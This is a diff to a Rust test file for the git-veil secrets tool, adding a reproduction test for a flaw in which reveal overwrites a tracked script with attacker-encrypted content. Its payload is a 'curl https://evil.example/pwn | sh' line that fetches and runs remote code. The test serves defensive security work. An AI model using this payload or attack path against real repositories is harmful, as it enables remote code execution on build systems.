@@ -6,8 +6,8 @@
 
 use age::secrecy::ExposeSecret;
 use git_veil::{
-    cmd_add, cmd_hide, cmd_import, cmd_init, cmd_remove, cmd_removeperson, cmd_tell, cmd_trust,
-    cmd_verify_keyring, decrypt_with_identity, exit_code_of, generate_identity,
+    cmd_add, cmd_hide, cmd_import, cmd_init, cmd_remove, cmd_removeperson, cmd_reveal, cmd_tell,
+    cmd_trust, cmd_verify_keyring, decrypt_with_identity, exit_code_of, generate_identity,
     generate_signing_keypair, recipient_from_identity, TrackedFiles,
 };
 
@@ -547,4 +547,98 @@ fn fix_remove_keep_ciphertext_trips_the_orphan_gate() {
     let err = cmd_hide(&f.repo.path, "origin", &f.key_store.path, false)
         .expect_err("hide must refuse the kept-back orphaned ciphertext");
     assert_eq!(exit_code_of(&err), 42);
+}
+
+// ---------------------------------------------------------------------------
+// UNCOMMITTED REPRO — reveal-clobber issue mapped to git-veil (task 376)
+//
+// git-secret's reveal clobbers a TRACKED-IN-GIT repo file (e.g. deploy.sh)
+// with attacker-chosen ciphertext, giving RCE in the documented CI flow.
+// git-veil's reveal looks equally exposed: it writes attacker-committed
+// ciphertext over whatever plaintext is at the tracked path, and a
+// tracked-in-git plaintext passes ensure_regular_file (it is a regular
+// file). The ciphertext can be crafted by ANYONE (the ring's recipient
+// keys are public), needs no keyring re-sign, and the committed .secret
+// counts as "established" so the exit-72 intent gate does not apply to
+// reveal. This test must be committed + turned into an issue (needs user
+// confirmation per the externalization rule).
+// ---------------------------------------------------------------------------
+
+#[test]
+fn repro_f1_reveal_clobbers_tracked_repo_file() {
+    let f = Fixture::new("f1-reveal-clobber");
+
+    // The victim: a legitimate collaborator with an identity in their key
+    // store (this store simulates the victim's machine).
+    let victim = generate_identity();
+    let victim_recipient = recipient_from_identity(&victim);
+    fs::write(f.repo.join("victim.recipient"), &victim_recipient).unwrap();
+    cmd_tell(
+        &f.repo.path,
+        "victim@example.com",
+        "victim.recipient",
+        "origin",
+        &f.key_store.path,
+        None,
+    )
+    .expect("tell victim");
+    fs::write(
+        f.repo.join("victim.age"),
+        format!("{}\n", victim.to_string().expose_secret()),
+    )
+    .unwrap();
+    cmd_import(&f.repo.path, &["victim.age".to_string()], &f.key_store.path)
+        .expect("import victim");
+
+    // A NORMAL repo source file, tracked in git — never a secret, never
+    // git-veil add'ed. The victim would never hide this.
+    fs::create_dir_all(f.repo.join("ci")).unwrap();
+    fs::write(f.repo.join("ci/deploy.sh"), "#!/bin/sh\necho legitimate\n").unwrap();
+
+    // ATTACK: a repo writer nominates the source file in tracked.json and
+    // commits a payload ciphertext encrypted to the ring's PUBLIC keys
+    // (no signing key needed — only the keyring signature must verify,
+    // and the attacker leaves the keyring untouched).
+    fs::write(
+        f.repo.join(".git-veil/tracked.json"),
+        "{\n  \"files\": [\n    \"ci/deploy.sh\"\n  ]\n}",
+    )
+    .unwrap();
+
+    let keyring_text = fs::read_to_string(f.repo.join(".git-veil/keyring")).unwrap();
+    let ring = git_veil::Keyring::parse(&keyring_text).unwrap();
+    let recipients: Vec<_> = ring
+        .entries
+        .iter()
+        .map(|e| git_veil::parse_recipient(&e.recipient).unwrap())
+        .collect();
+    let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
+    let evil_ct = git_veil::encrypt_to_recipients(payload, &recipients).unwrap();
+    fs::write(f.repo.join("ci/deploy.sh.secret"), evil_ct).unwrap();
+    f.stage_all(); // attacker commits tracked.json + the evil ciphertext
+
+    // VICTIM: reveal in the documented CI flow.
+    let result = cmd_reveal(
+        &f.repo.path,
+        "victim@example.com",
+        "origin",
+        &f.key_store.path,
+    );
+    let outcome = match result {
+        Ok(()) => "CLOBBERED",
+        Err(e) => {
+            println!("reveal refused: {e:#}");
+            "REFUSED"
+        }
+    };
+    println!("reveal-clobber outcome on git-veil: {outcome}");
+    let on_disk = fs::read_to_string(f.repo.join("ci/deploy.sh")).unwrap();
+    println!("ci/deploy.sh now: {on_disk}");
+    if outcome == "CLOBBERED" {
+        assert_eq!(
+            on_disk,
+            String::from_utf8_lossy(payload),
+            "reveal-clobber APPLIES: reveal overwrote a tracked repo file with attacker payload"
+        );
+    }
 }
